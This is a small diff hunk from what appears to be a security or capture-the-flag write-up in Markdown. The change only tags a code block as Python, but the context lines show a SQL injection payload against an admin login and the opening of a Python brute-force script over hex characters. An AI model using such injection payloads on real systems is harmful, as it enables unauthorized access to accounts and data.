@@ -70,7 +70,7 @@ admin' and password like '0e%'-- -
 ```
 
 #### Python Script
-~~~
+~~~python
 import requests
 
 chars = [0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f'] # Just hex characters.
